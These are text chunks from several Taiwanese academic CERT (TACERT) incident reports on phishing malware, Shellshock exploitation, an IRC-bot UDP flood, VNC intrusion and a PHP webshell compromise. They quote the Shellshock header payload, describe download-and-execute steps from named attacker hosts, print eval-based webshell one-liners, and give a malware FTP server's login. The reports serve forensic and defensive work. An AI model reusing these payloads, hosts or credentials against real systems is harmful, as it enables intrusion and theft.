此惡意信件資訊為:  6 4. 該信附件『102 年 “T 單位” 期中報告",
        "Page_Num": "4,5,6,7"
    },
    "231": {
        "File_Name": "個案分析-S單位與E單位之APT社交工程事件分析_10208.pdf",
        "content": ".rar』(35KB),解壓縮後為『102 年 度 “T 單位” 期中報告V1.docx.scr』(60KB)。 5. 該scr 執行檔沒有偽裝很成功,檔案圖示也不是word,明顯為惡意程式。 七、 檢測過程-E 單位: 1. 將信件檔案『102 年度 “T 單位” 期中報告V1.docx.scr』執行後,該檔案 並不會消失,但也不會有word 打開。 2. 產生一隻叫做『ProtectedStorage.exe』程式於背景執行,並開啟TCP Port 對外連線至上層的中繼站140.X.X.15:443,然而該中繼站當時已經被管理 者處理過,所以連線並無建立成功。 3. 『ProtectedStorage.exe』在隱藏目錄C:\\Users\\username\\AppData\\Local\\。 4. 註冊機碼中並無惡意程式自動開機啟動。 圖8、『ProtectedStorage.exe』的內容 圖9、註冊機碼無寫入開機自動啟動 圖10、感染主機單純發送SYN request,但中繼站已無回應。 八、 惡意程式排除方式-E 單位: 1. 先將網路線拔除或關閉網路卡,以中斷連外網路。 2. 用工作管理員或procexp 將惡意程序ProtectedStorage.exe 刪除。 3. 將C:\\Users\\username\\AppData\\Local\\ProtectedStorage.exe 惡意程式移除。 4. 用autoruns 檢查是否有惡意程式開機自動啟動,並刪除之。 5. 用掃毒軟體掃瞄系統。 九、 兩事件上層為共同中繼站:  7 1. 該中繼站是台中Y 國中的套裝郵件伺服器。 2. 該伺服器被駭客入侵並開啟Port 443 作為中繼接收流量使用。 3. 該伺服器被入侵不久後,主機管理員已發現流量異常,故已經自行將惡意 程式移除,因此我們後來授權進去主機時已查不到任何痕跡。 4. 主機管理員也更改帳號密碼並加強ACL 的",
        "Page_Num": "7,8"
    },
    "232": {
        "File_Name": "個案分析-S單位與E單位之APT社交工程事件分析_10208.pdf",
        "content": "IP 登入限制。 5. 故測試E 單位接收信件的惡意程式時候已經無法與中繼站建立連線。 建議措施 1. 以上事件的都是針對學術單位的APT 郵件攻擊,且連至相同IP 的中繼 站。 2. 若有用Outlook 收信,至選項安全信中心關閉預設的附件瀏覽功能。 3. E 單位事件的惡意程式太明顯容易被識破,而S 單位事件的惡意程式隱 藏較好比較不易察覺。 4. 一旦執行惡意程式都可能會讓個資外洩,盡速修改密碼。 5. 可疑郵件檔案請先用Virustotal 線上掃毒,或用上傳至Google docs 開啟 以避免受害。 6. 帳密定期更改並避免使用過於簡易的密碼。 ",
        "Page_Num": "8"
    },
    "233": {
        "File_Name": "個案分析-S大學遭受Shellshock漏洞攻擊的主機事件分析報告_10403.pdf",
        "content": "個案分析- S 大學遭受Shellshock 漏 洞攻擊的主機事件分析報 告 TACERT 臺灣學術網路危機處理中心團隊製 2015/3  1 I. 事件簡介 A. 該校資訊管理人員接獲國外組織 Profihost AG Team 來信檢舉,該校有台 主機疑似對大量特定網段IP 進行 SSH/FTP 的帳號密碼暴力破解攻擊。 B. 該校資安人員請本單位TACERT 透過SSH 遠端進行數位鑑識及故障排除。 C. 該台主機主要用途為透過SNMP 協定監控校園內部設備的Linux 主機。 D. 以下為節錄檢舉信部分內容,主旨為SSH brute-force 的攻擊行為,以 下為遭受攻擊的IP 位址。 II. 事件檢測 A. 因為該主機的SSH 服務有限定內部網段能連入,故排除掉駭客透過此方 式入侵主機。 B. 首先透過netstat 指令檢查網路狀態,暫無發現可疑的應用程式及通訊 連線,主要有啟用到的正常服務為port 80 和443 的網頁服務,此為管 理者網站登入所需要。  2 C. 因為有啟用httpd 的網站服務,故檢查網站的access log 是否有異常, 雖然沒有phpmyadmin 的setup.php 漏洞,但記錄上仍可以看到許多人嘗 試存取該漏洞位址,失敗會出現 HTTP 404 的紀錄。 D. 研究發現實際上遭受入侵的方式就是近期很有名的Shellshock 漏洞,此 漏洞的嚴重程度是相當高的,駭客可以透過它執行apache 帳號的權限行 為,作為攻擊用殭屍主機。 E. 從以下LOG 紀錄發現,駭客(紫色IP)在HTTP 標頭裡面插入特殊符號 『(){ :;}』後,並利用已存在 /www/cgi-bin/test.sh 或任何sh 的檔 案就能夠進行紅底線標註的呼叫指令動作,主要原因是舊版本的BASH SHELL 可以透過此方式進行操控。 F. 以下這兩個指令來看,駭客應該是到209.20.86.222 下載一個j.txt ",
        "Page_Num": "1,2,3"
    },
    "234": {
        "File_Name": "個案分析-S大學遭受Shellshock漏洞攻擊的主機事件分析報告_10403.pdf",
        "content": "的 執行檔案到目錄「/tmp 和/var/tmp」中,並且執行perl 檔「j.txt」 向「50.57.187.242」或「209.62.65.146」進行報到動作,之後再透過 「rm –rf *.txt*\\」刪除下載的所有的txt 檔案。  3 G. 實際到網址209.20.86.222 的確能下載到j.txt,其內容適用perl 語 法撰寫的腳本,從以下內容節錄部分得知,會利用到本地端的port 80 和 443 向IRC 伺服器進行回報。 H. 另外從以下這兩個指令來看:  4 1. 駭客從54.170.156.84 透過漏洞到 「http://202.144.144.163/guide/」下載一個「b.pl」的執行檔案 到目錄「/tmp」中,並且執行perl 檔「b.pl」,之後再透過「rm – rf /tmp/b.pl*」刪除下載的檔案。 2. 駭客從74.219.225.231 透過漏洞到「http://it-mattes.de」下載一 個「q.jpg」的執行檔案到目錄「/tmp」中,並且執行perl 檔 「q.jpg」,之後再透過「rm –rf /tmp/q.jpg*」刪除下載的檔案。 3. 檢測網址「http://202.144.144.163/」,出現的是國家「不丹」的一 個網站,疑似是學校的資訊管理頁面,而 /guide/ 目錄下卻可以直 接存取到許多的惡意程式,可能已經遭受駭客入侵成為跳板。  5 4. 檢測德國網址「http://it-mattes.de」的網頁服務的確還是啟用 中,不過出現的是網站維護中,而原本的目錄下的q.jpg 已經不存 在。 5. 檢測系統資料夾檔案中有發現到,在目錄 /var/tmp/ 底下藏有一個 壓縮檔 new3.tar.gz,疑似為駭客植入的後門程式,且從檔案權限擁 有者為apache,故得知駭客是透過Shellshock 漏洞存取進入的。 6. ",
        "Page_Num": "3,4,5,6"
    },
    "235": {
        "File_Name": "個案分析-S大學遭受Shellshock漏洞攻擊的主機事件分析報告_10403.pdf",
        "content": "解開壓縮檔 new3.tar.gz 後有五個檔案,分別有「b、f、r、print 和pass.txt」,其中b 因為編譯過其內容並非明文,應該是用來作為 brute-force 的執行檔案,透過Virustotal 掃描有28/56 的偵測比 例為HackTool。  6 7. pass.txt 可能為記錄當時破解到的帳號密碼,而檔案f 為初始先刪 除先前得所有檔案,再從37.221.192.63 取得要掃描破解的IP 資訊 存入scan.log,然後執行檔案b 將資料存入t.log,再透過執行 print 將t.log 傳至IP 109.228.25.87/.p.php 進行接收,最後會將 取得的紀錄通通刪除。 8. 最後檔案r 的內容看起來只是部分的字典資料,可能為用來做暴力破 解的資料庫。  7 9. 引述維基百科對Shellshock 的簡單說明,Shellshock 又稱 Bashdoor,是在Unix 中廣泛使用的Bash shell 中的一個安全漏洞, 首次於2014 年9 月24 日公開。許多網際網路守護行程,如網頁伺服 器,使用bash 來處理某些命令,從而允許攻擊者在易受攻擊的Bash 版本上執行任意代碼,這可使攻擊者在未授權的情況下存取電腦系 統。 10.駭客透過網站掃描到目錄下的 http://[host]/chi-bin/test.sh,直 接透過網頁開啟會顯示該主機的版本相關資訊,也同時表示bash 的 指令可能透過此漏洞運行。 11.這次事件封包側錄時間較短,並無發現到有特定IP 利用Shellshock  8 漏洞“(){ :;}”嘗試存取GET test.sh 動作,故只能從先前的 Access Log 紀錄中得知駭客的行為。因此判定該惡意程式必須收到 上層駭客指令後才會開始進行對外攻擊。 12.簡易測試主機是否有此Shellshock 的漏洞,我們可以在linux console 下指令「env VAR='() { :;}; echo Bash is vulnerable!' bash",
        "Page_Num": "6,7,8,9"
    },
    "236": {
        "File_Name": "個案分析-S大學遭受Shellshock漏洞攻擊的主機事件分析報告_10403.pdf",
        "content": "-c \"echo Bash Test\"」,如果Bash 是有問題的話則會出現以下 訊息「Bash is vulnerable! Bash Test」。 13.修補方式則是盡快更新Bash 版本至最新版,以此CentOS 系統為例只 要做「yum update bash」即可以修復此漏洞。 III. 網路架構圖 Hackers & C&C (A)5.39.86.39 (法國) (B)54.170.156.84 (美國) (C)74.219.225.231 (美國) STEP 5 SSH brute-force 攻擊 Port 22 受害的Web主機 140.X.X.Y (TANET) Victims STEP 2 HTTP下載惡意程式 j.txt、b.pl、q.jpg STEP 1 Shellshock 漏洞入侵 HTTP HEADER STEP 3 受害主機受報到資料 Port 80、443 IRC servers: 50.57.187.242 (美國) 209.62.65.146 (美國) 中繼站 (A)209.20.86.222 (美國) (B)204.144.144.163(不丹) (C)it-mattes.de (德國) 蒐集用中繼站: 109.228.25.87/.p.php (英國) STEP 6 回報SSH破解成功的主機資訊 HTTP Method 提供需掃描IP的C&C: 37.221.192.63 (德國雲端主機) STEP 4 下載SCAN.log HTTP Method 1. 駭客透過HTTP 方式Shellshock 漏洞入侵受害主機,並帶有bash shell 指 令。 2. 受害主機接受到指令開始向上層中繼站群下載可用的惡意執行程式  9 j.txt、b.pl 或q.jpg。 3. 同時受害主機也會向上層IRC 主機port80 或443 進行報到動作。 4. 惡意程式中會去向另C&C 下載欲破解的主機IP 資料和字典庫。 5. 受害主機開始向特定大量的IP 進行SSH brute-force 破解。 6. 受害主機將破解成功的主機SSH 帳號密碼HTTP 回報給中繼站 109.228.25.87/.p.php 接收。 IV.建議與",
        "Page_Num": "9,10"
    },
    "237": {
        "File_Name": "個案分析-S大學遭受Shellshock漏洞攻擊的主機事件分析報告_10403.pdf",
        "content": "總結 A. 此次受害主機是遭受名為Shellshock 的漏洞攻擊。 B. 此攻擊的危害程度頗大,駭客無須直接入侵主機就能透過HTTP 利用 BASH Shell 漏洞執行或植入惡意程式。 C. 受害主機成為殭屍電腦後開始向特定主機進行SSH 或Telnet 的暴力破 解。 D. 並將破解後的資料回傳給上層中中繼站,且大多惡意主機都是用雲端租 用主機或免費空間,更難以追查源頭。 E. 可以透過特殊指令或網站去測試是否有此Shellshock 漏洞,並且盡快進 行Bash 套件的更新即可修補此漏洞。 F. 時常留意是否有異常的流量或檢查Access log 也能防範被入侵的可能。 G. 目前Shellshock 的漏洞參數已可被IPS 或IDS 設備規則偵測到,故勿以 直接用此漏洞做主機測試以免被開立資安事件單。 V. Shellshock 相關資訊連結 1. TACERT –【漏洞預警】GNU Bash 存在高風險CVE-2014-6271 與CVE- 2014-7169 (ShellShock)弱點 (2014-09-26)  http://cert.tanet.edu.tw/prog/showrpt.php?id=2859 2. TWNCERT - GNU Bash ‘Shellshock’ 弱點資訊更新 (2014/10/2)  http://www.twncert.org.tw/NewInfoDetail.aspx?seq=1434&lan  10 g=zhiT 3. iThome - Linux 大廠二度釋出Shellshock 漏洞的修補程式!  http://www.ithome.com.tw/news/91180 4. 檢查及修復 Shellshock 漏洞  http://www.hkcode.com/linux-bsd-notes/855 ",
        "Page_Num": "10,11"
    },
    "238": {
        "File_Name": "個案分析-UDP DDoS分析報告_10202.pdf",
        "content": "個案分析- UDP DDoS 攻擊分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2013/2  1 Taiwan Academic Network Computer emergency Response Team(TACERT) 前言 DoS 攻擊(阻斷服務攻擊,Denial of Service Attack),如果是多台主機同時進行則為DDoS (分散式阻斷服務攻擊Distributed Denial of Service Attack),可以分為兩大類,第一類 將資源耗盡,如網路頻寬、主機CPU 等,它在短時間內向某特定主機發出大量服務請 求或是傳送大量封包,藉此耗盡網路頻寬或是耗盡主機資源,使得主機無法提供服務, 暫時癱瘓。第二類藉著異常封包毀損設置不恰當的主機,例如攻擊設定上有漏洞的路由 器(Router 等[1]。 第一類將資源耗盡的DoS 有以下幾種: 1. ICMP Flood:攻擊者發送超過主機處理上限的ICMP 封包給主機,使得主機當 機或重新開機無法提供服務。 2. SYN Flood:TCP 連線建立之前必須先進行三向交握(Three-Way Handshake) (1)客戶端送出SYN 封包給伺服器 (2)伺服器接著送出SYN+ACK 給客戶端 (3)客戶端送ACK 給伺服端 ㄧ個合法完整的三向交握,必須(1)(2)(3)都進行完畢才是完成。而這種 SYN Flood 攻擊,會進行大量的(1),當伺服器進行(2)時,(3)不會被完 成,於是伺服器停留在(3)等待,若伺服器在短時間內收到由客戶端送來的 大量SYN 封包,但卻得不到客戶端的回應,伺服器就會無法完成連線,耗盡 Session 數量,無法提供服務。 3. UDP Flood:相較於TCP,UDP 是一種不可靠的傳輸協定,並不需要進行三向 交握就可以向伺服器請求服務,當伺服器收到請求服務的UDP 封包,會交給 負責的應用程式,接著回應處理狀況。同樣的,當應用程式收到過多的UDP 封包,會導致服務無法正常提供。  2 Taiwan Academic Network Computer emergency Response Team(TACERT) 事件描述 2012 年末,TANet ",
        "Page_Num": "1,2,3"
    },
    "239": {
        "File_Name": "個案分析-UDP DDoS分析報告_10202.pdf",
        "content": "上出現了幾台主機,發出大量的UDP 封包,消耗了TANet 主要骨幹 的大量頻寬,使得某些學校的網路頻寬一瞬間被用盡,無法上網,這種癱瘓網路的方法 被稱為UDP Flood 攻擊,本次介紹其中一台主機: – 作業系統:Windows 7 – 主機上的常駐服務:FTP、Apache、No-ip domain、遠端登入(帳號z 密 碼z) – 服務對象:實驗室學生公用主機,主要拿來上傳資料下載資料 主機自安裝之後,並沒有特定的管理者,學生使用No-ip domain[2]連上該主機,用FTP 上傳檔案到主機後,利用HTTP 協定下載檔案。此外該主機也是實驗室的公用電腦,任 何人都可以使用,由於使用者眾,為方便記憶,其帳號密碼為皆為「z」。 主機被發現時,已經停止發送大量封包的行為,但是仍可從主機的網路狀況分析發動 UDP Flood 的程式為何,圖1 為主機被發現時的網路狀態。上面顯示該主機有兩個IRC Bot 程式,PID 分別為1732(紅色框)和1296(綠色框),其中PID1296 名稱為「mirc.exe」 的惡意程式,為這起UDP Flood 攻擊的主要惡意程式。由於之後再也沒有出現大規模的 UDP Flood 攻擊,僅能從該主機狀況推斷,駭客透過IRC 伺服器給予命令,使其發動 UDP Flood 攻擊,其架構圖推測如圖2。UDP Flood 事件發生之後,該主機上的mirc.exe 仍會發送少量個UDP 封包如圖3,其目的網路位址並沒有明顯規律。  3 Taiwan Academic Network Computer emergency Response Team(TACERT) 圖1 兩個IRC 程式,PID 分別為1732 和1296 圖2 mirc.exe 從IRC Server 接收指令,在特定時間發動UDP Flood  4 Taiwan Academic Network Computer emergency Response Team(TACERT) 圖3 由mirc.exe 發出的大量UDP 封包 Mirc 是一個受歡迎的聊天軟體(官網:http://www.mirc.com/),台灣",
        "Page_Num": "3,4,5"
    },
    "240": {
        "File_Name": "個案分析-UDP DDoS分析報告_10202.pdf",
        "content": "國內較少人使用, 在國外極常見,從官網下載的mirc.exe 與本案出現的mirc.exe 標誌極相似,可以推斷是 為了讓使用者混淆,以為它是合法的mirc.exe。遇到這樣情況,最快的判斷方法就是將 exe 擋上傳到VirusTotal 上去,交給防毒軟體判斷。圖6 可以看到該程式在VirusTotal 上 有39/46 的偵測率。 圖4 正版mirc.exe  5 Taiwan Academic Network Computer emergency Response Team(TACERT) 圖5 惡意mirc.exe,圖示與正版mirc 極為相似 圖6 惡意的mirc.exe 在VirusTotal 上的掃描結果 建議措施  定期更改主機服務登入密碼  6 Taiwan Academic Network Computer emergency Response Team(TACERT) 以此事件為例,實驗室的學生表示,公用主機因為使用者眾多,為了方便,設置簡單易 記憶的密碼,且密碼極少更改。當密碼被駭客得知入侵之後,管理員發現異常刪除惡意 程式或重灌主機,但卻沒有更改原本的帳號密碼,仍會被駭客再度入侵。  對提供遠端存取的服務限定存取網路位址 主機的網路位址及主機上的服務,由於網路的特性,駭客只要利用自動掃描工具,馬上 就可以知道主機位址及上面運行的服務,像SSH 服務與FTP 服務,帳號密碼很容易被 暴力破解。因此,主機上任何可以遠端登入的服務,應該對其登入對象限定網路位址, 尤其是root 帳號,Linux 主機提供su 命令可以切換帳號,建議把可以遠端登入的帳號權 限設定在安全的範圍內,登入之後再切換root 便可。各種保護措施雖然會增加不便,但 可減少被駭客入侵的機率。 參考 [1] http://newsletter.ascc.sinica.edu.tw/news/read_news.php?nid=1869 [2] http://www.noip.com/ ",
        "Page_Num": "5,6,7"
    },
    "241": {
        "File_Name": "個案分析-V大學透過VNC入侵的伺服器事件分析報告_10310.pdf",
        "content": "個案分析- V 大學透過VNC 入侵的 伺服器事件分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2014/10  1 I. 事件簡介 A. 今年偕同行政院技服中心前往至該大學,鑑識一台疑似遭受入侵有APT 惡意網路行為的主機。 B. 詢問該主機管理人員得知為某學生宿舍的一台桌上型的主機,IP 位址為 140.X.Y.252,作業系統為舊版的Windows XP,用途為集中監視器畫面 管理。 C. 預設有安裝UltraVNC 的遠端桌面軟體,方便維護廠商外部連線管理。 D. 遠端登入的帳號和密碼極為簡易,密碼是統計最常見的排行榜前十名, 只有六位數字排序。 E. 主機並無限制外部來源端網段或IP,其為了方便廠商連入維護。 F. 本單位側錄該主機的網路封包,並觀察系統的網路運作狀態。 II. 事件檢測 A. 首先透過netstat 指令檢測紀錄中已開啟的通訊埠,主要有TCP Port 80、443、5800、5900、9988、40000 和50000。 B. 經過封包分析得知,Port 40000 和 50000 主要是由兩個台灣的IP 111.185.7.154 和114.198.173.241 連入,其中封包傳輸的資料都是經 過加密無法解析,且主要流量都是透過主機port 50000 回覆給主機 111.185.7.154,平均一個檔案都有8MB 左右。  2 C. 從netstat 命令資料中得知 port 80 是啟用的,表示有啟用Web Service, 且從process 程序中看出的確有啟用Apache 的服務。 1. 嘗試透過瀏覽器直接輸入該主機位址140.X.Y.252,為DVR 的登入畫 面,但隨意輸入帳號密碼後雖然無法登入成功,卻可以列出監視器的 相關資訊,例如Channel 的說明和使用的Port 40000。 2. 因此我們判斷程序Apache、ChateauSVR、ChateauHD 分別使用port 80、40000、50000 為監視器廠商所使用。  3 3. 再來port 5800 和5900 所使用的PID 程序為UltraVN",
        "Page_Num": "1,2,3,4"
    },
    "242": {
        "File_Name": "個案分析-V大學透過VNC入侵的伺服器事件分析報告_10310.pdf",
        "content": "C,這是一款常 見的遠端桌面操控軟體,主要是讓維護商可以遠端管理,但是因為密 碼過於簡單導致駭客成功登入控制。因為安裝的是舊版VNC,內無登 入IP 的LOG 紀錄可追查。 4. 然而從側錄的封包中我們發現到有幾筆IP 嘗試登入的紀錄,表示可 能已經被入侵成功過,主要有85.214.143.217、202.153.164.126、 213.233.88.128 和185.56.80.101 等。 5. 其中來自德國的 85.214.143.217 嘗試登入數量最多,但記錄上並沒 有成功登入,都出現存取拒絕的訊息,可能正在嘗試做大量破解入侵 準備。  4 6. 而來自羅馬尼亞的213.233.88.128 則是成功登入UltraVNC,從封包 紀錄發現駭客使用一個相當簡易的編碼方式傳送指令,就是重複字元 編碼,創立了一個名為「JavaUpdatess158」的資料夾,並且連到 「ftp.servage.net」,並且用帳號「vncexe」和密碼「Pula321」登 入下載檔案「boss1.exe」的檔案,並隨後再刪除。 7. 嘗試用以上的帳號密碼果然能夠登入該網站 ftp.servage.net,並且 內部有兩個執行檔案,分別為「svchost.exe」和 「wget.exe」,此 「svchost.exe」疑似是客製化的惡意程式,透過Virustotal 線上病 毒掃描的檢測率為0。  5 8. 特別的是IP 202.153.164.126 有成功登入主機,並且是來自是台灣 方電信的IP 而非國外,登入的時候剛好被我們錄影下來存證。從封 包來看是從UltraVNC 的port 5900 登入,駭客很俐落的打開 cmd.exe 視窗,並且檢查netstat 的網路狀態服務是否有被關閉,該 主機事實上被用來作為線上遊戲(射擊對戰遊戲)的私人伺服器,因為 有發現到該遊戲的資料夾而非管理員安裝,以下為駭客正在操作的錄 影截圖(背景為DVR 畫面",
        "Page_Num": "4,5,6"
    },
    "243": {
        "File_Name": "個案分析-V大學透過VNC入侵的伺服器事件分析報告_10310.pdf",
        "content": ")。 9. 最後Port 443 都是被同一支程式所啟用,從process explore 看只 能知道為svchost.exe,然而從側錄封包中可以看到port 443 所回 應內容中有nginx 的web service,研判應該是變異過的nginx 套  6 件。 a. 從封包中知道外部的人透過GET method 方式並帶有特定加密的 cookie 參數,而伺服器則同樣回應加密字串。 b. 連入主機port 443 的IP 約有7 個國家,大多數為台灣和韓國, 並且固定使用的網域名稱「torchi2.dyndns.org」作解析。 c. 然而目前此名稱「torchi2.dyndns.org」的IP 已經變成另一個受 害者59.120.116.245,為Hinet 的固定制IP。 d. 稍微檢測目前「59.120.116.245」主機發現一樣有開啟port 80、443、5800、5900,其中5800 和5900 為VNC 服務所用,埠 443 則是為nginx 所用,透過zenmap 掃描得知port 80 則應為 skype 所用。經網頁測試port 5800 發現因為Java 特殊權限無法 正常開啟,但是透過html code 可以看出黃色圈選部分帶有某公 司名稱及UltraVNC 字樣,猜測此主機可能也遭受相同手法入侵。  7 e. 若嘗試輸入http://torchi2.dyndns.org:443 則會回覆自己的主 機IP 位址,以此案件學校的封包分析來看也是如此,如下圖藍色 圈選之IP。 f. 因為封包內容都經過加密,我們也無法明確知道其內容,但研判 作為私人線上遊戲伺服器供外部使用者連入使用。 10.駭客將主機內部設定動態網域名稱,定期會向免費網域網站 「checkip.dyndns.org」進行檢查動作,確保該網域名稱 「torchi2.dyndns.org」維持正常使用,下圖中紫色為報到主機。  8 III. 網路架構圖 Hacker STEP 1 : 維護廠商安裝VNC服務從外部連入140.X.Y.252維護管理。 STEP",
        "Page_Num": "6,7,8,9"
    },
    "244": {
        "File_Name": "個案分析-V大學透過VNC入侵的伺服器事件分析報告_10310.pdf",
        "content": "2 : 駭客破解VNC的超級弱的密碼後植入其他軟體。 STEP 3 : 主機被駭客用來作為遊戲伺服器供外部使用者從「torchi2.dyndns.org」連入。 STEP 4 : 任何匿名者也都能登入到或破解原服務 Web DVR介面進行畫面監視。 STEP 5 : 「torchi2.dyndns.org」後來解析到其他企業主機進行可能入侵的行為。 Clients 59.120.116.245 STEP 3 Game Service Port 443 140.X.Y.252 DVR & Game Server STEP 2 VNC Intrusion Port 5900 torchi2.dyndns.org Manufacturers STEP 1 VNC Login Port 5900、40000、50000 STEP 4 Web DVR Port 80 Anonymous STEP 5 Another Victim Port 80、443、 VNC IV. 建議與總結 A. 此主機主要是因為維護廠商在宿舍的監視器用途主機上安裝 VNC 的遠端桌面軟體,目的是可以從外部方便連入維護。  9 B. 然而因為設定的密碼超級簡單導致駭客輕易破解入侵,並且防 火牆並無限制來源端的網段或IP 存取。 C. 在現場封包側錄時候剛好遇到駭客連入VNC 並進行網路狀態操 作,追查來源端IP 為是方電信所有,可能為駭客的跳板IP。 D. 主機本身裝有Apache 服務提供Web DVR 的登入管理,就算輸 入錯誤的帳號密碼,Web DVR 依然會條列出所有監視器camera 的註解,若密碼被破解則監視器影像紀錄就可能被修改。 E. 建議主機管理員設置VNC 和Web DVR 的防火牆白名單,除了特 定IP 和網段能夠連入,其他一律拒絕存取。 F. 建議VNC 和DVR 的登入密碼每半個月更改一次,並且搭配數 字、英文及符號來增強密碼安全。 G. 很多時候電腦中毒重灌之後依然再次發生的原因,很可能就是 使用習慣照舊,軟體密碼防火牆的設定都要加強防護,全面性 的審查才能降低再次被感染的風險。 ",
        "Page_Num": "9,10"
    },
    "245": {
        "File_Name": "個案分析-X大學系所網站駭侵攻擊事件分析報告_10808.pdf",
        "content": "X 大學系所網站駭侵攻擊 事件分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2019 年8 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、 事件簡介 1. 近期接獲某學校反應校內一個系所網站之根目錄資料夾會遭受不明來源的 index.php 生成。 2. 該網站預設首頁為default.asp,非index.php。 3. 當index.php 產生時,會造成網站首頁功能不正常。 4. 該主機是一台windows server 2008 Service Pack 2 (32 位元)的系所網頁伺服 器,主要提供系所介紹及相關資訊。 5. 該主機使用IIS 架站, 以ASP 為主,搭配PHP 模組。 6. 為了解觸發事件原因、駭客可能之攻擊行為與危害程度,本中心進行實機鑑 識。 二、事件檢測 1. 首先,檢視受害網站伺服器的系統資訊,得知下列訊息: (1) 防火牆在事件發生前未開啟,在事件發生後才開啟。 (2) 有啟用遠端桌面功能。 (3) Windows Update 有定期更新。 (4) 該主機在事件發生前未安裝防毒軟體,在事件發生後才安裝。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 2. 查看主機對外port 開啟狀態,發現該主機開啟許多port,其中包含駭客最常 利用的port(如445、3389)。 3. 檢視網站根目錄資料夾內檔案的擁有者,發現sitemapsjxtkdsy 與symx 兩資 料夾的擁有者皆為IUSR,非administrator,推測這兩個資料夾為駭客所建立, 而且兩個資料夾的修改日期與建立日期皆為2019/7/18,推測該時間為事件發 生點。 4. 在sitemapsjxtkdsy 資料夾發現有兩個.gz 的壓縮檔,將兩個壓縮檔解壓縮後, 會有map4.xml 與map7.xml 兩個檔案,查看兩個檔案內容發現為日文版的購 物網頁,推測駭客可能懂日文。  3 臺灣學術網路危機處理中心",
        "Page_Num": "1,2,3,4"
    },
    "246": {
        "File_Name": "個案分析-X大學系所網站駭侵攻擊事件分析報告_10808.pdf",
        "content": "(TACERT) TANet Computer Emergency Response Team 5. 在symx 資料夾內有無檔名的.htaccess、komut.php、php.ini 與s.pl 等四個檔案, 其中komut.php 開啟後看到「一句話木馬」的語法,會開啟 https://gist.githbusercontent.com/../komut.php,但komut.php 已經不在該網站上。 檢視s.pl 內容,發現該檔案為一個網站目錄列舉的腳本,來自作者0x1999 的 網站http://0xdark.blogsport.com 資訊,從該網站內容可以知道該名作者懂印 尼文,而且在該網站上教導使用者如何駭入網站,也於網站上販售後門程式。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 從.htaccess 的內容得知該檔案會重寫網址,輸入任意的html 檔將會顯示 index.php 的內容,推測該檔案主要用來幫駭客改寫網站首頁用。 6. 管理者將事件發生期間每日所產生的index.php 與相關檔案收集起來,這些 index.php 檔案大小與內容皆相同,而且也發現一個可疑檔案rdp.php。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 7. 檢視index.php 內容,發現除了php 語法外,還有一些亂碼,其中有urldecode 一段亂碼,經嘗試解碼仍無法看出其內容。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 8. 檢視rdp.php 內容,看到內含一句話木馬 「eval(htmlspecialchars_decode(urldecode(base64_decode($UeXploiT))));」,將$ UeXploiT 的亂碼內容放入一句話木馬中,解出 「eval('?&amp;gt;'.gzuncompress(gzinflate(gzinflate(base64_decode(strrev($An0 n_3xPloiTeR))))));」,無法識別其內容。 9. 在網站根目錄的images ",
        "Page_Num": "4,5,6,7"
    },
    "247": {
        "File_Name": "個案分析-X大學系所網站駭侵攻擊事件分析報告_10808.pdf",
        "content": "資料夾內發現new_readme.php,該檔案的擁有者為 IUSR,而且修改日期為2019/7/18,與sitemapsjxtkdsy 與symx 兩資料夾相同 日期。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 檢視new_readme.php 的內容,發現該檔案為使用php 建立ssh 連線的程式, 在內容中提到index.php 與.htaccess 兩檔案,推測new_readme.php、index.php 與.htaccess 三個檔案在程式執行時彼此間有關係。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 10. 在網站根目錄\\alumni\\election 內發現css.php,該檔案擁有者為IUSR,建立 日期與修改日期皆為2019/1/31,可見該主機在2019/1 已經被入侵。  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 11. 從網站日誌紀錄發現,日本IP:136.144.53.29 在2019/7/18 下午3:15 起POST kmoiqfrdwe.php 17 次。 之後在2019/7/18 15:46 成功地讀取index.php,為當日第一筆get index.php 成功的紀錄,,推測該IP 為本次資安事件的駭客IP 來源。 在index.php 後面會有加入一些參數,疑似將要執行的指令透過這些參數傳給 index.php 去執行,例如: /index.php?pd=smyedit&mapname=amaps.xml&action=ping。 從日本IP 讀取 /images/wp-aespa.php?path=D:/eehome 得知駭客知道網站根 目錄的所在位置,而且日本IP 還曾經透過wp-aespa.php 成功地上傳東西至 D:/eehome 中。雖然有多個IP 曾經存取過該網站主機,但透過日本IP 在 2019/7/18 對網站主機的攻擊行為,可推測此日本IP 為導致本資安事件的主",
        "Page_Num": "7,8,9,10,11"
    },
    "248": {
        "File_Name": "個案分析-X大學系所網站駭侵攻擊事件分析報告_10808.pdf",
        "content": "要駭客IP。  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 12. 荷蘭IP:37.48.116.184 在2019/1/8 下午10:05 曾經POST upload.php,之後 00.php 第一次被讀取,推測所上傳的內容為00.php。 13. 從網站日誌中發現每當POST 00.php 時,同時同一IP 會讀取一個新的PHP 檔,推測00.php 可能具有檔案上傳功能。 14. 在事件發生期間,波蘭IP:51.68.157.81 與德國IP:51.75.92.17 曾經透過00.php 上傳PHP 檔,接著在讀取這些PHP 檔案時加入「php=http://網址/em.txt」的參 數,此做法可以讓em.txt 的內容以php 檔執行。  12 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 15. 該網站主機的事件檢視器的第一筆紀錄日期為2019/7/19 13:23,事件發生日 2019/7/18 的紀錄已不存在。從2019/7/19 開始出現大量4625 登入失敗紀錄, 推測有駭客在嘗試暴力攻擊主機。 16. 在2019/7/21 18:14 開始校內IP:140.X.X.50 使用網路匿名登入主機, 從所側 錄封包發現該IP 會連線受害主機的445port 與1433 port。  13 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 三、事件攻擊行為示意圖 從網站日誌紀錄發現該網站主機有多個IP 駭入主機的現象,但是以事件時 間2019/7/18 與index.php 出現時間判斷,僅日本IP:136.144.53.29 有明 顯攻擊行為,故本事件的攻擊行為示意圖將以日本IP 的攻擊行為為主。 